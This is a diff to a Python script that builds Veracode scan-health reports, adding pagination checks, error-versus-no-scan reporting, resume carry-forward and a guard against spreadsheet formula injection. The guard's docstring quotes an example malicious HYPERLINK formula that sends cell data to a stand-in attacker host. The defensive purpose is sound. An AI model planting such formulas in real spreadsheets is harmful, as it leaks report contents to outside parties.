@@ -10,6 +10,7 @@ Requirements:
 
 from __future__ import annotations
 
+import sys
 import csv
 import json
 import math
@@ -54,6 +55,7 @@ REGIONS: dict[str, dict[str, str]] = {
 }
 
 _NS = re.compile(r'\sxmlns="[^"]+"')
+_NS_B = re.compile(rb'\sxmlns="[^"]+"')
 _DT_FMTS = ("%Y-%m-%dT%H:%M:%S%z", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S %Z", "%Y-%m-%d %H:%M:%S UTC")
 _URL_RE = re.compile(r'https?://\S+')
 
@@ -262,6 +264,24 @@ class AggIssue:
 # Helpers
 # ==========================================================================
 
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _safe_cell(v: object) -> object:
+    """Neutralise spreadsheet formula injection.
+
+    App names, module names and uploaded file names are attacker-controlled:
+    anyone able to create an app profile or upload an artifact chooses them.
+    openpyxl types a leading '=' as a real formula, so a value such as
+    =HYPERLINK("http://evil/?d="&A1,"x") executes when a reviewer opens the
+    report. Prefixing with an apostrophe forces text without altering the
+    visible value. Numbers, dates and bools are passed through untouched.
+    """
+    if isinstance(v, str) and v.startswith(_FORMULA_LEAD):
+        return "'" + v
+    return v
+
+
 def _si_or_none(v: object) -> int | None:
     """Int or None. Distinguishes 'absent' from 'zero', which matters for any
     Veracode-supplied score where 0 is a real and very bad value."""
@@ -406,7 +426,8 @@ class AuthError(Exception):
     """Raised on 401/403 to signal credential issues."""
 
 class VeracodeClient:
-    def __init__(self, region: str = "commercial", timeout: int = 120) -> None:
+    def __init__(self, region: str = "commercial", timeout: int = 120,
+                 pool_size: int = 10) -> None:
         self._cfg = REGIONS[region]
         self._timeout = timeout
         self._s = requests.Session()
@@ -415,7 +436,11 @@ class VeracodeClient:
         retry = Retry(total=3, backoff_factor=1.0,
                       status_forcelist=(429, 500, 502, 503, 504),
                       allowed_methods=("GET",))
-        self._s.mount("https://", HTTPAdapter(max_retries=retry))
+        # Default pool_maxsize is 10; above that, urllib3 discards connections
+        # and silently loses keep-alive, which matters on large tenants.
+        pool = max(10, pool_size)
+        self._s.mount("https://", HTTPAdapter(max_retries=retry,
+                                              pool_connections=pool, pool_maxsize=pool))
 
     def close(self) -> None: self._s.close()
     def __enter__(self) -> "VeracodeClient": return self
@@ -433,8 +458,10 @@ class VeracodeClient:
         r = self._s.get(f"{self._cfg['xml']}/{ep}", params=params, timeout=self._timeout)
         self._check_auth(r)
         r.raise_for_status()
-        # Strip ALL xmlns attributes (count=0) for clean XPath
-        return ET.fromstring(_NS.sub("", r.text, count=0))
+        # Parse bytes, not r.text: the XML declaration is authoritative, while
+        # r.text falls back to charset guessing when the server sends no
+        # charset, which can mis-decode non-ASCII app and file names.
+        return ET.fromstring(_NS_B.sub(b"", r.content, count=0))
 
     def _rest(self, path: str, params: dict | None = None) -> dict:
         r = self._s.get(f"{self._cfg['rest']}{path}", params=params, timeout=self._timeout)
@@ -458,7 +485,17 @@ class VeracodeClient:
                     "bu": (p.get("business_unit") or {}).get("name",""),
                     "policy": pols[0].get("name","") if pols else ""})
             page += 1
-            if page >= (d.get("page") or {}).get("total_pages", 1): break
+            total_pages = (d.get("page") or {}).get("total_pages")
+            if total_pages is None:
+                # Field absent: keep paging until a page comes back empty rather
+                # than assuming a single page, which would silently truncate a
+                # large tenant to the first 500 profiles.
+                continue
+            if page >= total_pages: break
+        total_elements = (d.get("page") or {}).get("total_elements")
+        if isinstance(total_elements, int) and total_elements != len(apps):
+            log.warning("Application list may be incomplete: API reported %d profiles, "
+                        "retrieved %d.", total_elements, len(apps))
         return apps
 
     def get_builds(self, aid: int, sbx: str | None = None) -> list[dict]:
@@ -1194,10 +1231,23 @@ def _process_build(client: VeracodeClient, app: dict, builds: list[dict],
 
 
 def _empty_result(app: dict, lid: int, sandbox: str = "") -> ScanResult:
+    """Profile genuinely has no policy scan."""
     return ScanResult(app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
         app_id=lid, sandbox=sandbox, scan_status="No Scan", health="Poor",
         high_issues=1, total_issues=1, issues_text="[HIGH] No policy scan found",
         recs_text="None", age_bucket="N/A")
+
+
+def _error_result(app: dict, lid: int, err: str, sandbox: str = "") -> ScanResult:
+    """Retrieval failed. Deliberately distinct from _empty_result: a transient
+    API error must never be reported as 'this application was never scanned',
+    because that is a materially different and misleading conclusion."""
+    return ScanResult(app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
+        app_id=lid, sandbox=sandbox, scan_status="Error", health="Unknown",
+        high_issues=0, total_issues=0,
+        issues_text=f"[ERROR] Could not retrieve scan data: {err[:200]}",
+        recs_text="Re-run this application; results are unavailable, not absent.",
+        age_bucket="N/A")
 
 
 def _process_app(client: VeracodeClient, app: dict, skip_no: bool, inc_sb: bool,
@@ -1241,6 +1291,29 @@ def _process_app(client: VeracodeClient, app: dict, skip_no: bool, inc_sb: bool,
 # ==========================================================================
 # Resume
 # ==========================================================================
+
+def _load_prior_rows(path: str, sheet: str) -> list[dict]:
+    """Read a sheet from a prior run back into row dicts, so a resumed run can
+    carry earlier results forward instead of emitting only the remainder."""
+    rows: list[dict] = []
+    try:
+        wb = load_workbook(path, read_only=True)
+        if sheet not in wb.sheetnames:
+            wb.close(); return rows
+        ws = wb[sheet]
+        it = ws.iter_rows(values_only=True)
+        headers = [str(h) if h is not None else "" for h in next(it, ())]
+        if not headers:
+            wb.close(); return rows
+        for r in it:
+            if r is None or all(v is None for v in r):
+                continue
+            rows.append({h: v for h, v in zip(headers, r) if h})
+        wb.close()
+    except Exception as e:
+        log.warning("Could not read '%s' from %s: %s", sheet, path, e)
+    return rows
+
 
 def _load_resume_keys(path: str) -> set[tuple[str, str]]:
     keys: set[tuple[str, str]] = set()
@@ -1321,7 +1394,7 @@ def _sheet(ws: object, rows: list[dict], hcol: str | None = None, age_col: str |
     hds=list(rows[0].keys()); ws.append(hds); _hdr(ws,len(hds)); ws.freeze_panes="A2"
     for ri,rd in enumerate(rows,2):
         for ci,h in enumerate(hds,1):
-            cl=ws.cell(row=ri,column=ci,value=rd.get(h,"")); cl.font=_DF; cl.border=_BD
+            cl=ws.cell(row=ri,column=ci,value=_safe_cell(rd.get(h,""))); cl.font=_DF; cl.border=_BD
             if hcol and h==hcol:
                 cl.fill=PatternFill("solid",fgColor=_CLR.get(str(rd.get(h,"")),"FFFFFF")); cl.alignment=_CA
             elif age_col and h==age_col:
@@ -1433,9 +1506,29 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
     return rows
 
 
+XLSX_MAX_ROWS = 1_048_576   # Excel/openpyxl hard limit
+
+
+def _fit_sheet(rows: list[dict], name: str) -> list[dict]:
+    """Truncate a sheet that cannot physically fit, rather than letting
+    openpyxl raise after the entire (multi-hour) collection run has finished.
+    Only the per-file and per-module sheets can realistically reach this."""
+    limit = XLSX_MAX_ROWS - 1          # one row reserved for the header
+    if len(rows) <= limit:
+        return rows
+    log.error("[!] '%s' has %d rows, exceeding the Excel limit of %d. Writing the "
+              "first %d rows only. Use --output-format csv to keep the full detail.",
+              name, len(rows), XLSX_MAX_ROWS, limit)
+    return rows[:limit]
+
+
 def write_excel(health: list[dict], mods: list[dict], files: list[dict],
                 recs: list[dict], trends: list[dict], agg: list[dict], path: str,
                 dash_bundle: dict | None = None) -> None:
+    health = _fit_sheet(health, "Scan Health Summary")
+    mods = _fit_sheet(mods, "Module Details")
+    files = _fit_sheet(files, "Uploaded Files")
+    recs = _fit_sheet(recs, "Recommendations")
     wb=Workbook()
     ws=wb.active; ws.title="Scan Health Summary"
     if not health: ws["A1"]="No data."; wb.save(path); return
@@ -1483,9 +1576,17 @@ def write_csv(health: list[dict], mods: list[dict], files: list[dict],
                        ("recommendations",recs),("trends",trends),("aggregation",agg)]:
         if not rows: continue
         p = parent / f"{stem}_{name}.csv"
+        # Union of keys, not just the first row's, so a heterogeneous batch
+        # (e.g. rows carried forward from an older report) cannot raise.
+        fields: list[str] = []
+        for rd in rows:
+            for k in rd:
+                if k not in fields: fields.append(k)
         with open(p, "w", newline="", encoding="utf-8") as f:
-            w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
-            w.writeheader(); w.writerows(rows)
+            w = csv.DictWriter(f, fieldnames=fields, extrasaction="ignore")
+            w.writeheader()
+            for rd in rows:
+                w.writerow({k: _safe_cell(rd.get(k, "")) for k in fields})
         log.info("[+] CSV: %s", p)
 
 
@@ -2844,7 +2945,7 @@ def _write_table(ws, row: int, headers: list[str], data: list[list],
             span = spans[idx]
             if span > 1:
                 ws.merge_cells(start_row=r, start_column=col, end_row=r, end_column=col + span - 1)
-            c = ws.cell(row=r, column=col, value=v)
+            c = ws.cell(row=r, column=col, value=_safe_cell(v))
             styler(c, idx)
             for cc in range(col, col + span):
                 ws.cell(row=r, column=cc).border = _BORDER
@@ -3181,7 +3282,7 @@ def _write_app_heatmap_sheet(wb: Workbook, apps: Sequence[ApplicationHealth], cf
 
     for ri, row in enumerate(rows, hr + 1):
         for ci, h in enumerate(headers, 1):
-            c = ws.cell(row=ri, column=ci, value=row.get(h))
+            c = ws.cell(row=ri, column=ci, value=_safe_cell(row.get(h)))
             c.font = Font(name=_FONT, size=9)
             c.border = _BORDER
             c.alignment = Alignment(
@@ -3241,7 +3342,7 @@ def _write_issue_heatmap_sheet(wb: Workbook, issue_rows: list[dict],
                 row["Business Units Affected"], row["Previous Apps Affected"],
                 row["Trend"], row["Top Recommendation"]]
         for ci, v in enumerate(vals, 1):
-            c = ws.cell(row=ri, column=ci, value=v)
+            c = ws.cell(row=ri, column=ci, value=_safe_cell(v))
             c.font = Font(name=_FONT, size=9)
             c.border = _BORDER
             c.alignment = Alignment(
@@ -3348,6 +3449,22 @@ def main() -> None:
                         "json; with xlsx the dashboard sheets are added to the main report")
     args = p.parse_args()
 
+    # Validate numeric options up front; bad values otherwise fail deep into a
+    # long run (or, for parallel<1, raise inside ThreadPoolExecutor).
+    if args.parallel < 1:
+        p.error("--parallel must be >= 1")
+    if args.delay < 0:
+        p.error("--delay must be >= 0")
+    if args.timeout < 1:
+        p.error("--timeout must be >= 1")
+    if args.max_apps < 0:
+        p.error("--max-apps must be >= 0")
+    if args.app_name_filter:
+        try:
+            re.compile(args.app_name_filter)
+        except re.error as e:
+            p.error(f"--app-name-filter is not a valid regex: {e}")
+
     logging.basicConfig(level=getattr(logging, args.log_level),
                         format="%(asctime)s %(levelname)-5s %(message)s", datefmt="%H:%M:%S",
                         force=True)
@@ -3358,9 +3475,19 @@ def main() -> None:
         log.info("[*] Skipping checks: %s", sorted(skip_checks))
 
     resume_keys: set[tuple[str, str]] | None = None
+    prior: dict[str, list[dict]] = {}
     if args.resume:
         resume_keys = _load_resume_keys(args.resume)
-        log.info("[*] Resume: %d apps already processed", len(resume_keys))
+        for _sheet, _key in (("Scan Health Summary", "health"), ("Module Details", "modules"),
+                             ("Uploaded Files", "files"), ("Recommendations", "recs"),
+                             ("Trends", "trends")):
+            prior[_key] = _load_prior_rows(args.resume, _sheet)
+        log.info("[*] Resume: %d profiles already processed, carrying forward %d prior rows",
+                 len(resume_keys), sum(len(v) for v in prior.values()))
+        if Path(args.resume).resolve() == Path(args.output).resolve():
+            log.error("--resume and --output are the same file (%s). Refusing to run: the "
+                      "resumed report would overwrite the results being read.", args.output)
+            sys.exit(2)
 
     prev_data: dict | None = None
     if args.previous_report:
@@ -3370,7 +3497,8 @@ def main() -> None:
     name_filter = re.compile(args.app_name_filter) if args.app_name_filter else None
 
     try:
-        with VeracodeClient(args.region, timeout=args.timeout) as client:
+        with VeracodeClient(args.region, timeout=args.timeout,
+                            pool_size=max(10, args.parallel * 2)) as client:
             log.info("[*] Region: %s", args.region)
             apps = client.get_apps()
             log.info("[*] Found %d apps", len(apps))
@@ -3390,10 +3518,15 @@ def main() -> None:
             all_sr: list[ScanResult] = []; all_mr: list[ModuleRow] = []
             all_fr: list[FileRow] = []; all_rr: list[RecommendationRow] = []
             all_ai: list[AggIssue] = []; all_tr: list[TrendRow] = []
+            failures: list[str] = []
+            stop = threading.Event()
             lock = threading.Lock()
             delay_lock = threading.Lock()
+            next_slot = 0.0
 
             def _do_app(idx_app: tuple[int, dict]) -> None:
+                if stop.is_set():
+                    return
                 idx, app = idx_app
                 log.info("[%d/%d] %s (id=%s)", idx, len(apps), app["name"], app.get("legacy_id"))
                 try:
@@ -3408,32 +3541,54 @@ def main() -> None:
                         log.info("    %s | Issues: %d%s", s.health, s.total_issues, sb)
                 except AuthError as e:
                     log.error("Authentication failed: %s", e)
+                    stop.set()
                     raise
                 except Exception as e:
-                    log.warning("    [!] Failed: %s", e)
+                    log.warning("    [!] Failed: %s: %s", type(e).__name__, e)
                     with lock:
-                        all_sr.append(_empty_result(app, app.get("legacy_id",0)))
+                        failures.append(app["name"])
+                        all_sr.append(_error_result(app, app.get("legacy_id", 0),
+                                                    f"{type(e).__name__}: {e}"))
                 if args.delay > 0:
+                    # Global pacing without serialising the workers: hold the
+                    # lock only long enough to claim the next slot, then sleep
+                    # outside it. Previously every worker queued on a lock held
+                    # for the full sleep, so throughput collapsed to 1/delay
+                    # regardless of --parallel.
                     with delay_lock:
-                        time.sleep(args.delay)
+                        nonlocal next_slot
+                        now = time.monotonic()
+                        next_slot = max(now, next_slot) + args.delay
+                        wait = next_slot - now
+                    if wait > 0:
+                        time.sleep(wait)
 
             if args.parallel > 1:
-                with ThreadPoolExecutor(max_workers=args.parallel) as pool:
+                pool = ThreadPoolExecutor(max_workers=args.parallel)
+                try:
                     futs = {pool.submit(_do_app, (i, a)): a for i, a in enumerate(apps, 1)}
                     for fut in as_completed(futs):
                         try: fut.result()
-                        except AuthError: raise
+                        except AuthError:
+                            # Cancel the queue instead of letting the executor
+                            # drain thousands of doomed requests on shutdown.
+                            for f in futs: f.cancel()
+                            stop.set()
+                            raise
                         except Exception as e: log.warning("Worker error: %s", e)
+                finally:
+                    pool.shutdown(wait=True, cancel_futures=True)
             else:
                 for i, app in enumerate(apps, 1):
+                    if stop.is_set(): break
                     _do_app((i, app))
 
             # Build output rows
-            h_rows = [s.to_row() for s in all_sr]
-            m_rows = [m.to_row() for m in all_mr]
-            f_rows = [f.to_row() for f in all_fr]
-            r_rows = [r.to_row() for r in all_rr]
-            t_rows = [t.to_row() for t in all_tr]
+            h_rows = prior.get("health", []) + [s.to_row() for s in all_sr]
+            m_rows = prior.get("modules", []) + [m.to_row() for m in all_mr]
+            f_rows = prior.get("files", []) + [f.to_row() for f in all_fr]
+            r_rows = prior.get("recs", []) + [r.to_row() for r in all_rr]
+            t_rows = prior.get("trends", []) + [t.to_row() for t in all_tr]
             agg = _build_aggregation(all_ai, len(h_rows))
 
             log.info("\n[*] Writing %d health / %d module / %d file / %d rec / %d trend rows...",
@@ -3465,6 +3620,11 @@ def main() -> None:
                 write_dashboard_xlsx(xp, bundle)
                 log.info("[+] Dashboard workbook: %s", xp)
 
+            if failures:
+                log.warning("[!] %d application(s) could not be retrieved and are marked "
+                            "'Error' in the report (not 'No Scan'): %s",
+                            len(failures), ", ".join(failures[:10])
+                            + (" ..." if len(failures) > 10 else ""))
             _print_summary(h_rows)
 
     except AuthError as e:
